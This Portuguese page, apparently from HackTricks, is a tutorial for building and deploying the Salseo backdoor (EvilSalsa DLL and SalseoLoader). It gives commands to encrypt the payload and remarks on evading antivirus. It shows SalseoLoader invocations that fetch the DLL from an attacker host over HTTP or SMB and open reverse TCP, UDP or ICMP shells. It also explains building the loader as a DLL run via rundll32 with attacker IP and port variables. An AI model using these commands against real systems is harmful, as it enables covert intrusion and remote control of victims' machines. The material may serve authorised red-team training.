# Salseo

{% hint style="success" %}
Aprenda e pratique Hacking AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Compilando os binários

Baixe o código-fonte do github e compile **EvilSalsa** e **SalseoLoader**. Você precisará do **Visual Studio** instalado para compilar o código.

Compile esses projetos para a arquitetura do Windows onde você irá usá-los (Se o Windows suportar x64, compile-os para essa arquitetura).

Você pode **selecionar a arquitetura** dentro do Visual Studio na **aba "Build"** em **"Platform Target".**

(\*\*Se você não encontrar essas opções, clique em **"Project Tab"** e depois em **"\<Nome do Projeto> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Em seguida, compile ambos os projetos (Build -> Build Solution) (Dentro dos logs aparecerá o caminho do executável):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Preparar o Backdoor

Primeiramente, você precisará codificar o **EvilSalsa.dll.** Para fazer isso, você pode usar o script python **encrypterassembly.py** ou pode compilar o projeto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, agora você tem tudo o que precisa para executar todo o Salseo: o **EvilDalsa.dll codificado** e o **binário do SalseoLoader.**

**Faça o upload do binário SalseoLoader.exe para a máquina. Eles não devem ser detectados por nenhum AV...**

## **Executar a backdoor**

### **Obtendo um shell reverso TCP (baixando dll codificada através do HTTP)**

Lembre-se de iniciar um nc como ouvinte do shell reverso e um servidor HTTP para servir o EvilDalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso UDP (baixando dll codificada através do SMB)**

Lembre-se de iniciar um nc como ouvinte do shell reverso e um servidor SMB para servir o evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtendo um shell reverso ICMP (dll codificada já dentro da vítima)**

**Desta vez, você precisa de uma ferramenta especial no cliente para receber o shell reverso. Baixe em:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desativar Respostas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Executar o cliente:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro da vítima, vamos executar o negócio do salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando o SalseoLoader como DLL exportando a função principal

Abra o projeto SalseoLoader usando o Visual Studio.

### Adicione antes da função principal: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Instale o DllExport para este projeto

#### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Procure pelo pacote DllExport (usando a aba Procurar), e pressione Instalar (e aceite o popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Na pasta do seu projeto aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**

### **Desinstale o DllExport**

Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Saia do Visual Studio e execute DllExport\_configure**

Apenas **saia** do Visual Studio

Em seguida, vá para a sua **pasta do SalseoLoader** e **execute DllExport\_Configure.bat**

Selecione **x64** (se você for usá-lo dentro de um ambiente x64, que foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) e pressione **Aplicar**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Abra o projeto novamente com o Visual Studio**

**\[DllExport]** não deve mais estar marcado como erro

![](<../.gitbook/assets/image (8) (1).png>)

### Construa a solução

Selecione **Tipo de Saída = Biblioteca de Classes** (Projeto --> Propriedades do SalseoLoader --> Aplicativo --> Tipo de saída = Biblioteca de Classes)

![](<../.gitbook/assets/image (10) (1).png>)

Selecione **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Compilar --> Destino da plataforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Para **construir** a solução: Build --> Build Solution (Dentro do console de saída aparecerá o caminho da nova DLL)

### Teste a DLL gerada

Copie e cole a DLL onde deseja testá-la.

Execute:
```
rundll32.exe SalseoLoader.dll,main
```
Se nenhum erro aparecer, provavelmente você tem uma DLL funcional!!

## Obter um shell usando a DLL

Não se esqueça de usar um **servidor HTTP** e configurar um **ouvinte nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Aprenda e pratique AWS Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
